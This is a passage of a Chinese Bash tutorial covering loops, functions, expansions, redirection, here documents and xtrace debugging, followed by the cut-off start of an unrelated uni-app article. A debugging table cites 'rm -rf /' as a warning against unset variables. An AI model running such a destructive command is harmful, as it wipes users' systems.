  mv "$FILE" "${DIR}/scripts"
done
<span class="hljs-meta prompt_"># </span><span class="bash">将 /home/zp 目录下所有 sh 文件拷贝到 /home/zp/scripts</span>
</code></pre>
<h5 data-id="heading-36">while循环</h5>
<p>while 是构建<strong>持续运行服务</strong>或<strong>按行读取文件</strong>的神器</p>
<pre><code class="hljs language-shell" lang="shell">while [[ condition ]]
do
<span class="hljs-meta prompt_">  #</span><span class="bash"><span class="hljs-comment">## 语句</span></span>
done
</code></pre>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">基本条件循环</span>
count=0
while [[ $count -lt 3 ]]; do
    echo "Count: $count"
    ((count++)) # 现代 Bash 数学运算推荐写法，别用 expr
done
<span class="hljs-meta prompt_">
# </span><span class="bash">逐行读取文件</span>
<span class="hljs-meta prompt_"># </span><span class="bash">将 file.txt 的内容一行行读入 line 变量</span>
while read -r line; do
    echo "Processing: $line"
done &lt; "config.txt"
</code></pre>
<h5 data-id="heading-37">until循环</h5>
<p>逻辑与 while 刚好相反：<strong>直到条件成立</strong>才停止。实战中用得少，通常用于“等待某个服务启动”</p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">等待 Postgres 端口 (5432) 连通</span>
until nc -z localhost 5432; do
    echo "Waiting for DB..."
    sleep 1
done
echo "DB started!"
</code></pre>
<h5 data-id="heading-38">select循环</h5>
<p><code>select</code>循环帮助我们组织一个用户菜单。它的语法几乎跟<code>for</code>循环一致：</p>
<pre><code class="hljs language-shell" lang="shell">select answer in elem1 elem2 ... elemN
do
<span class="hljs-meta prompt_">  #</span><span class="bash"><span class="hljs-comment">## 语句</span></span>
done
</code></pre>
<p>select 会打印<code>elem1..elemN</code>以及它们的序列号到屏幕上，之后会提示用户输入。通常看到的是<code>$?</code>。用户的选择结果会被保存到<code>answer</code>中。如果<code>answer</code>是一个在<code>1..N</code>之间的数字，那么语句会被执行，紧接着会进行下一次迭代，跳出循环使用<code>break</code>语句</p>
<pre><code class="hljs language-shell" lang="shell">PS3="请选择包管理器: "  # 设置提示符
select item in bower npm gem pip; do
    if [[ -n "$item" ]]; then
        echo "你选择了: $item"
        # 实际逻辑...
        break # 选完后跳出菜单
    else
        echo "输入无效，请重试。"
    fi
done
</code></pre>
<h5 data-id="heading-39">控制跳转</h5>
<p>如果想提前结束一个循环或跳过某次循环执行，可以使用 shell 的<code>break</code>和<code>continue</code>语句来实现。它们可以在任何循环中使用</p>
<ul>
<li><strong>break</strong>：直接跳出<strong>整个</strong>循环（结束遍历）</li>
<li><strong>continue</strong>：跳过<strong>本次</strong>循环剩余代码，直接进入下一次</li>
</ul>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># 寻找 10 到 20 之间的第一个能被 5 整除的数</span>
<span class="hljs-keyword">for</span> (( num=<span class="hljs-number">10</span>; num&lt;=<span class="hljs-number">20</span>; num++ )); <span class="hljs-keyword">do</span>
    <span class="hljs-keyword">if</span> (( num % <span class="hljs-number">5</span> == <span class="hljs-number">0</span> )); <span class="hljs-keyword">then</span>
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"Found divisible by 5: <span class="hljs-variable">$num</span>"</span>
        <span class="hljs-built_in">break</span>  <span class="hljs-comment"># 找到一个就退出循环</span>
    <span class="hljs-keyword">fi</span>
<span class="hljs-keyword">done</span>

<span class="hljs-comment"># 输出：Found divisible by 5: 10 (这里只是示例，实际上 10 就是)</span>
</code></pre>
<h3 data-id="heading-40">函数</h3>
<p>Shell 函数是脚本组织和复用代码的核心。定义函数有两种主流语法：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 推荐，POSIX 兼容性好</span>
<span class="hljs-function"><span class="hljs-title">func_name</span></span>() {
    <span class="hljs-comment"># 函数体</span>
    <span class="hljs-built_in">return</span> 0
}

<span class="hljs-comment"># Bash 特有，明确显示 function 关键字</span>
<span class="hljs-keyword">function</span> func_name {
    <span class="hljs-comment"># 函数体...</span>
}
</code></pre>
<blockquote>
<p>💡 说明：</p>
<ol>
<li>函数定义时，<code>function</code>关键字可有可无</li>
<li>函数返回值 - return 返回函数返回值，返回值类型只能为整数（0-255）。如果不加 return 语句，shell 默认将以最后一条命令的运行结果，作为函数返回值</li>
<li>函数返回值在调用该函数后通过<code>$?</code>来获得</li>
<li>Shell 是解释执行的，必须<strong>先定义、后调用</strong>，调用函数仅使用函数名即可<code>func_name arg1 arg2</code></li>
</ol>
</blockquote>
<h4 data-id="heading-41">作用域</h4>
<p>在 Shell 函数中定义变量，默认是<strong>全局 (Global)</strong> 的，这会修改脚本其他地方的同名变量。在函数内部，始终使用<code>local</code>关键字声明变量</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 错误示范 (污染全局)</span>
<span class="hljs-function"><span class="hljs-title">bad_func</span></span>() {
    result=<span class="hljs-string">"Hacked!"</span> <span class="hljs-comment"># 修改了外面的变量</span>
}

<span class="hljs-comment"># 正确示范 (局部隔离)</span>
<span class="hljs-function"><span class="hljs-title">good_func</span></span>() {
    <span class="hljs-built_in">local</span> result=<span class="hljs-string">"Safe"</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"Inside: <span class="hljs-variable">$result</span>"</span>
}
</code></pre>
<h4 data-id="heading-42">函数传参</h4>
<p>函数内部有自己的一套<strong>位置参数</strong>系统。当调用 my_func 10 20 时：</p>
<ul>
<li>函数内的<code>$1</code>是 10（而不是脚本本身的第一个参数）</li>
<li>函数内的<code>$#</code>是传递给该函数的参数个数</li>
<li>函数内的<code>$0</code>仍然是<strong>脚本文件名</strong>，而非函数名（获取函数名需用 $FUNCNAME）</li>
</ul>





























<table><thead><tr><th>变量</th><th>描述</th></tr></thead><tbody><tr><td><code>$0</code></td><td>脚本名称</td></tr><tr><td><code>$1 … $9</code></td><td>函数接收的第 1 到 9 个参数</td></tr><tr><td><code>$*</code> or <code>$@</code></td><td>不包括<code>$0</code>，函数内接收的所有参数列表</td></tr><tr><td><code>$#</code></td><td>不包括<code>$0</code>，函数内接收的参数总个数</td></tr><tr><td><code>$FUNCNAME</code></td><td>函数名称（仅在函数内部有值）</td></tr></tbody></table>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>

<span class="hljs-comment"># 一个健壮的处理参数的函数模板</span>
<span class="hljs-function"><span class="hljs-title">deploy_app</span></span>() {
    <span class="hljs-built_in">local</span> app_name=<span class="hljs-variable">$1</span>
    <span class="hljs-built_in">local</span> version=<span class="hljs-variable">${2:-"latest"}</span> <span class="hljs-comment"># 支持默认值</span>

    <span class="hljs-keyword">if</span> [[ -z <span class="hljs-string">"<span class="hljs-variable">$app_name</span>"</span> ]]; <span class="hljs-keyword">then</span>
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"Usage: <span class="hljs-variable">$FUNCNAME</span> &lt;app_name&gt; [version]"</span>
        <span class="hljs-built_in">return</span> 1 <span class="hljs-comment"># 返回错误状态码</span>
    <span class="hljs-keyword">fi</span>

    <span class="hljs-built_in">echo</span> <span class="hljs-string">"Deploying [ <span class="hljs-variable">$app_name</span> ] with version [ <span class="hljs-variable">$version</span> ]..."</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"Args count: <span class="hljs-variable">$#</span>"</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"Args list: <span class="hljs-variable">$@</span>"</span>
}

<span class="hljs-comment"># 调用</span>
deploy_app <span class="hljs-string">"nginx"</span> <span class="hljs-string">"1.24"</span>
<span class="hljs-comment"># deploy_app "redis"  &lt;-- 使用默认 version</span>
</code></pre>
<h4 data-id="heading-43">函数返回值</h4>
<p>这是 Shell 函数与其他语言（Java/Python）<strong>最大的区别</strong>。函数有两个“输出通道”：</p>
<p>:one:返回状态码（return）</p>
<p>用于控制逻辑流程，范围限制<code>0~255</code>，约定0为成功，非0为失败</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-function"><span class="hljs-title">check_file</span></span>() {
    [[ -f <span class="hljs-string">"<span class="hljs-variable">$1</span>"</span> ]] &amp;&amp; <span class="hljs-built_in">return</span> 0 || <span class="hljs-built_in">return</span> 1
}

<span class="hljs-comment"># 调用逻辑</span>
<span class="hljs-keyword">if</span> check_file <span class="hljs-string">"/etc/hosts"</span>; <span class="hljs-keyword">then</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"File exists!"</span>
<span class="hljs-keyword">fi</span>
</code></pre>
<p>:two:返回数据结果（return）</p>
<p>用于返回计算结果、字符串或处理后的数据。将结果打印到标准输出，调用者使用<code>$()</code>赋值给变量</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 错误做法：尝试 return 字符串或大数字</span>
<span class="hljs-comment"># calc() { return 300; } -&gt; $? 会变成 44 (因为 300%256 = 44)</span>

<span class="hljs-comment"># 正确做法：echo 输出结果</span>
<span class="hljs-function"><span class="hljs-title">calc_sum</span></span>() {
    <span class="hljs-built_in">local</span> a=<span class="hljs-variable">$1</span>
    <span class="hljs-built_in">local</span> b=<span class="hljs-variable">$2</span>
    <span class="hljs-built_in">local</span> result=$(( a + b ))
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">$result</span>"</span>  <span class="hljs-comment"># 打印到 stdout</span>
}

<span class="hljs-comment"># 捕获数据</span>
total=$(calc_sum 10 200) 
<span class="hljs-built_in">echo</span> <span class="hljs-string">"Total is: <span class="hljs-variable">$total</span>"</span> <span class="hljs-comment"># Output: 210</span>
</code></pre>
<h3 data-id="heading-44">Shell进阶</h3>
<p>在 Shell 接收到我们输入的一行命令后，并不会直接丢给内核执行。在此之前，它会进行一系列精密的解析和预处理</p>
<ul>
<li>扩展（Expansions）：将符号转换具体的值（如变量替换、算术计算）</li>
<li>重定向（Redirections）：重新排布输入输出的数据流向</li>
</ul>
<h4 data-id="heading-45">Shell扩展体系</h4>
<p>扩展本质上是一种**“替换机制”**。Shell 会扫描命令行中的特殊标记（Tokens），将其替换为最终的字符串，然后才运行命令</p>
<h5 data-id="heading-46">大括号扩展</h5>
<p>大括号扩展是最先被执行的扩展。它用于生成任意字符串序列，<strong>不仅限于已存在的文件</strong></p>
<ul>
<li>字符串枚举</li>
</ul>
<pre><code class="hljs language-shell" lang="shell">echo beg{i,a,u}n
<span class="hljs-meta prompt_"># </span><span class="bash">Output: begin began begun</span>
</code></pre>
<ul>
<li>序列生成</li>
</ul>
<pre><code class="hljs language-shell" lang="shell">echo {0..5}       # 生成 0 1 2 3 4 5
echo {a..e}       # 生成 a b c d e
echo {10..20..2}  # [步长] 生成 10 12 14 16 18 20
</code></pre>
<blockquote>
<p>⚡场景实战：<code>cp config.conf{,.bak}</code> 等价于 <code>cp config.conf config.conf.bak</code></p>
</blockquote>
<h5 data-id="heading-47">命令置换</h5>
<p>允许将一个命令的<strong>标准输出</strong>结果，作为另一个命令的参数。当一个命令被 `` 或 $() 包围时，命令置换将会执行</p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">获取当前日期并赋值</span>
current_time=$(date +%T)
<span class="hljs-meta prompt_">
# </span><span class="bash">查找 docker 的绝对路径并显示详情</span>
ls -l $(which docker)
</code></pre>
<h5 data-id="heading-48">算数扩展</h5>
<p>Bash 处理整数运算的原生方式。算数表达式必须包在<code>$(( ))</code>中，双括号内部引用变量无需加<code>$</code>前缀</p>
<pre><code class="hljs language-shell" lang="shell">x=10
y=5
<span class="hljs-meta prompt_">
# </span><span class="bash">基础运算</span>
echo $(( x + y ))     # Output: 15
<span class="hljs-meta prompt_"># </span><span class="bash">复杂运算（先算乘法）</span>
result=$(( (x + y) * 2 )) 
<span class="hljs-meta prompt_">
# </span><span class="bash">C 风格的自增（Side Effect）</span>
echo $(( ++x ))       # x 变为 11，输出 11
</code></pre>
<h4 data-id="heading-49">流与重定向</h4>
<p>在 Linux 中，一切皆文件，Shell 程序之间的协同工作，依赖于**数据流（Streams）**的传送与重组</p>
<h5 data-id="heading-50">文件描述符</h5>
<p>任何一个进程启动时，内核都会默认打开三个“文件”端口：</p>





























<table><thead><tr><th align="left">句柄 (FD)</th><th align="left">名称</th><th align="left">缩写</th><th align="left">默认指向</th></tr></thead><tbody><tr><td align="left"><strong>0</strong></td><td align="left">标准输入</td><td align="left"><code>stdin</code></td><td align="left">键盘输入</td></tr><tr><td align="left"><strong>1</strong></td><td align="left">标准输出</td><td align="left"><code>stdout</code></td><td align="left">屏幕终端</td></tr><tr><td align="left"><strong>2</strong></td><td align="left">标准错误</td><td align="left"><code>stderr</code></td><td align="left">屏幕终端</td></tr></tbody></table>
<blockquote>
<p><strong>💡为什么会有 2 个输出？</strong>
为了将“正常的业务结果”与“报错信息”分离。当我们在管道中 <code>| grep</code> 时，默认只处理 stdout，确保报错信息不会污染下游的数据处理</p>
</blockquote>
<h5 data-id="heading-51">重定向运算符</h5>








































<table><thead><tr><th align="left">运算符</th><th align="left">作用</th><th align="left">记忆技巧</th></tr></thead><tbody><tr><td align="left"><strong><code>&gt;</code></strong></td><td align="left"><strong>覆盖</strong>输出 (stdout)</td><td align="left">箭头指向文件，原有内容被清空</td></tr><tr><td align="left"><strong><code>&gt;&gt;</code></strong></td><td align="left"><strong>追加</strong>输出 (stdout)</td><td align="left">双箭头代表追加，保留原内容</td></tr><tr><td align="left"><strong><code>2&gt;</code></strong></td><td align="left">重定向<strong>错误</strong> (stderr)</td><td align="left">显式指定 FD=2 (错误流)</td></tr><tr><td align="left"><strong><code>&amp;&gt;</code></strong></td><td align="left">重定向<strong>所有</strong> (1+2)</td><td align="left"><code>&amp;</code> 代表混合</td></tr><tr><td align="left"><strong><code>&lt;</code></strong></td><td align="left">重定向<strong>输入</strong></td><td align="left">箭头反向，从文件读取内容</td></tr><tr><td align="left"><strong><code>2&gt;&amp;1</code></strong></td><td align="left">将 stderr 指向 stdout</td><td align="left">让错误流并入正常流一起处理</td></tr></tbody></table>
<ul>
<li>错误日志分离</li>
</ul>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 正常的去 output.log，报错的去 error.log</span>
./deploy.sh &gt; output.log 2&gt; error.log
</code></pre>
<ul>
<li>全量日志合并</li>
</ul>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 将标准错误重定向到标准输出（&amp;1），然后一起写到文件</span>
<span class="hljs-comment"># 2&gt;&amp;1 必须写在最后</span>
./app_start.sh &gt; app.log 2&gt;&amp;1
</code></pre>
<ul>
<li>黑洞模式</li>
</ul>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 禁止一切输出（常用于静默运行定时任务）</span>
./silent_task.sh &gt; /dev/null 2&gt;&amp;1
</code></pre>
<blockquote>
<p><code>/dev/null</code>是一个特殊的文件，写入到它的内容都会被丢弃；如果尝试从该文件读取内容，那么什么也读不到</p>
</blockquote>
<h4 data-id="heading-52">Here Document</h4>
<p>Here Document（嵌入文档）是一种在 Shell 脚本中定义多行字符串输入的特殊语法，常用于自动生成配置文件或向命令投喂多行数据</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">command</span> &lt;&lt; <span class="hljs-string">MARKER
    ...Content...
MARKER</span>

<span class="hljs-comment"># MARKER：定界符，常用 EOF (End Of File)，但其实用什么词都可以</span>
<span class="hljs-comment"># 约束：结尾的定界符必须顶格写，且后面不能有空格</span>
</code></pre>
<ul>
<li>最常见的用法：动态生成一个配置文件</li>
</ul>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 将 EOF 之间的内容写入到 config.conf 文件中</span>
<span class="hljs-built_in">cat</span> &gt; /etc/nginx/conf.d/default.conf &lt;&lt; <span class="hljs-string">EOF
server {
    listen 80;
    server_name example.com;
}
EOF</span>
</code></pre>
<ul>
<li>通过 <code>wc -l</code> 命令计算 document 的行数：</li>
</ul>
<pre><code class="hljs language-shell" lang="shell">wc -l &lt;&lt; EOF
    This is a simple lookup program
    for good (and bad) restaurants
    in Cape Town.
EOF
<span class="hljs-meta prompt_">
# </span><span class="bash">output:</span>
<span class="hljs-meta prompt_"># </span><span class="bash">3</span>
</code></pre>
<h3 data-id="heading-53">Debug</h3>
<p>与其他高级语言拥有完善的 IDE 调试器不同，Shell 脚本的调试往往依赖日志和追踪模式。Shell 提供了一组强大的内建选项，帮助我们将脚本的执行过程可视化</p>
<h4 data-id="heading-54">三种调试方式</h4>
<p>最常用的调试参数是<code>-x (xtrace)</code>，开启后，Shell 会在执行每一行命令前，将<strong>变量替换后</strong>的完整命令打印到标准错误输出中</p>
<ul>
<li>命令行临时开启（无需修改脚本内容，用于临时排查问题）</li>
</ul>
<pre><code class="hljs language-bash" lang="bash">bash -x script.sh
</code></pre>
<ul>
<li>在头部Shebang永久开启（常用于开发阶段）</li>
</ul>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash -x</span>
</code></pre>
<ul>
<li>在脚本内动态开启（set命令）</li>
</ul>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">set</span> -x  <span class="hljs-comment"># 开启追踪</span>
<span class="hljs-comment"># ... 代码 ...</span>
</code></pre>
<h4 data-id="heading-55">调试输出</h4>
<p>当我们启用<code>-x</code>模式运行如下脚本：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
name=<span class="hljs-string">"Shell"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"Hello, <span class="hljs-variable">$name</span>"</span>
</code></pre>
<p>输出结果如下</p>
<pre><code class="hljs language-bash" lang="bash">+ name=Shell          &lt;-- 赋值操作
+ <span class="hljs-built_in">echo</span> <span class="hljs-string">'Hello, Shell'</span> &lt;-- 变量已被展开，<span class="hljs-variable">$name</span> 变成了 Shell
Hello, Shell          &lt;-- 真实的脚本执行结果
</code></pre>
<ul>
<li><code>+</code>：这是调试信息的默认前缀（由环境变量 $PS4 控制），每一层调用（如函数嵌套）会增加一个<code>+</code></li>
<li>变量展开：最核心的价值！可清楚看到变量<code>$name</code>在执行时变成了什么值，90% 的 Bug 都能通过这个发现</li>
</ul>
<h4 data-id="heading-56">局部调试</h4>
<p>如果脚本为几千行，全篇开启<code>-x</code>会导致屏幕被海量日志淹没。此时，我们只需要使用<code>set</code>命令包裹出可疑代码段即可</p>
<p>语法如下（有点反直觉）</p>
<ul>
<li><code>set -x</code>：开启调试（减号代表 Activate）</li>
<li><code>set +x</code>：关闭调试（加号代表 Deactivate）</li>
</ul>
<p>示例：只调试循环内部</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>

<span class="hljs-built_in">echo</span> <span class="hljs-string">"Start process..."</span>

<span class="hljs-comment"># 开启局部调试：只关心循环里的变量变化</span>
<span class="hljs-built_in">set</span> -x
<span class="hljs-keyword">for</span> (( i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++ )); <span class="hljs-keyword">do</span>
    <span class="hljs-comment"># 这里的信息会被打印出来，带有 '+' 前缀</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"Processing index: <span class="hljs-variable">$i</span>"</span>
<span class="hljs-keyword">done</span>
<span class="hljs-built_in">set</span> +x

<span class="hljs-built_in">echo</span> <span class="hljs-string">"End process..."</span> <span class="hljs-comment"># 这句正常执行，不会被追踪</span>
</code></pre>
<p>运行输出如下</p>
<pre><code class="hljs language-bash" lang="bash">Start process...
+ (( i = <span class="hljs-number">0</span> ))
+ (( i &lt; <span class="hljs-number">3</span> ))
+ <span class="hljs-built_in">echo</span> <span class="hljs-string">'Processing index: 0'</span>
Processing index: 0
+ (( i++ ))
+ (( i &lt; <span class="hljs-number">3</span> ))
+ <span class="hljs-built_in">echo</span> <span class="hljs-string">'Processing index: 1'</span>
Processing index: 1
...
+ <span class="hljs-built_in">set</span> +x
End process...
</code></pre>
<h4 data-id="heading-57">调试选项</h4>
<p>以下是开发中最常见的选项清单，按<strong>实用场景</strong>分类</p>
<p>🔧 核心调试与排错</p>



































<table><thead><tr><th>参数</th><th>全称</th><th>作用</th><th>使用场景</th></tr></thead><tbody><tr><td>-x</td><td>xtrace</td><td>打印每一行命令的执行轨迹</td><td>逻辑错误调试、变量值检查（<strong>最常用</strong>）</td></tr><tr><td>-v</td><td>verbose</td><td>打印原始输入行</td><td>通常配合 -x 使用，用于对比“代码原样”和“执行实况”</td></tr><tr><td>-n</td><td>noexec</td><td>只检查语法，不运行脚本</td><td>检查是否有 if 没写 fi、漏了引号等低级语法错误</td></tr><tr><td>-u</td><td>nounset</td><td>遇到未定义变量则报错</td><td><strong>防御性编程</strong>。防止因为变量名打错（如 $file_name 写成 $filename）导致 rm -rf /$filename 变成 rm -rf / 的惨剧</td></tr></tbody></table>
<p>⚙️ 行为控制与运行模式</p>



































<table><thead><tr><th>参数</th><th>全称</th><th>作用</th><th>使用场景</th></tr></thead><tbody><tr><td>-f</td><td>noglob</td><td>禁止通配符扩展。即 *, ? 不再自动扩展为文件名</td><td>当脚本需要处理大量包含 * 的特殊字符串（而非文件名）时开启</td></tr><tr><td>-e</td><td>errexit</td><td>遇到错误立即退出</td><td><strong>CI/CD 必备</strong>。构建脚本一旦某一步出错，不要继续执行后续操作</td></tr><tr><td>-i</td><td>interactive</td><td>强制脚本以交互 Shell 行为运行</td><td>调试.bashrc或需要模拟用户终端输入（TTY）的脚本</td></tr><tr><td>-t</td><td>-</td><td>读取并执行完<strong>一条</strong>命令后立刻退出</td><td>极少用的调试手段，用于精细控制脚本启动的第一步状态</td></tr></tbody></table></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[uni-app使用html5+创建webview，可以控制窗口大小、显隐、与uni通信]]></title>    <link>https://juejin.cn/post/7594863660297994282</link>    <guid>https://juejin.cn/post/7594863660297994282</guid>    <pubDate>2026-01-14T11:03:25.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594863660297994282" data-draft-id="7594262760939700258" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="uni-app使用html5+创建webview，可以控制窗口大小、显隐、与uni通信"/> <meta itemprop="keywords" content="前端,Trae"/> <meta itemprop="datePublished" content="2026-01-14T11:03:25.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="李剑一"/> <meta itemprop="url" content="https://juejin.cn/user/4147782344247918"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            uni-app使用html5+创建webview，可以控制窗口大小、显隐、与uni通信
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4147782344247918/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    李剑一
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T11:03:25.000Z" title="Wed Jan 14 2026 11:03:25 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc 